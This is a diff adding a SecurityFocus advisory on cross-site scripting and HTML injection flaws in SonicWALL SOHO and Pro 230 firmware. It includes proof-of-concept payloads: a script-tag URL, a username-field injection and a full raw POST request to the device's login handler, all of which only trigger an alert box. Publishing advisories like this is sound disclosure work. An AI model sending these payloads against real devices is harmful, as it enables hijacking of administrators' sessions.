@@ -1,0 +1,28 @@
+source: http://www.securityfocus.com/bid/12984/info
+
+Multiple remote input validation vulnerabilities affect SonicWALL SOHO. These issues are due to a failure of the application to properly sanitize user-supplied input prior to including it in dynamically generated Web content.
+
+Specifically a cross-site scripting issue and an HTML injection issue affect the vulnerable device.
+
+An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user. This may facilitate the theft of cookie-based authentication credentials as well as other attacks, potentially leading to a compromise of the affected device.
+
+SonicWALL Pro 230 firmware 6.5.0.3 is reported vulnerable to these issues as well. 
+
+http://www.example.com/<script>alert("Its not magic... its a sonic")</script>
+
+To leverage the HTML injection issue enter the following into the 'username' field of the login form:
+
+</TD><script>alert("!")</script>
+
+It is also possible to leverage the HTML injection issue by submitting the following POST request:
+
+POST http://192.168.168.168:80/auth.cgi HTTP/1.0
+Accept: */*
+Referer: http://192.168.168.168/auth.html
+Accept-Language: de
+Content-Type: application/x-www-form-urlencoded
+Proxy-Connection: Keep-Alive
+User-Agent: BadGuy
+Host: 192.168.168.168
+Content-Length: 160
+Pragma: no-cache uName=</TD><script>alert("Its_not_magic..._its_a_sonic")</script>&pass=NiceTry&Submit=Login&clientHash=bbe63bb858b02e741d2d12023ee350a1 
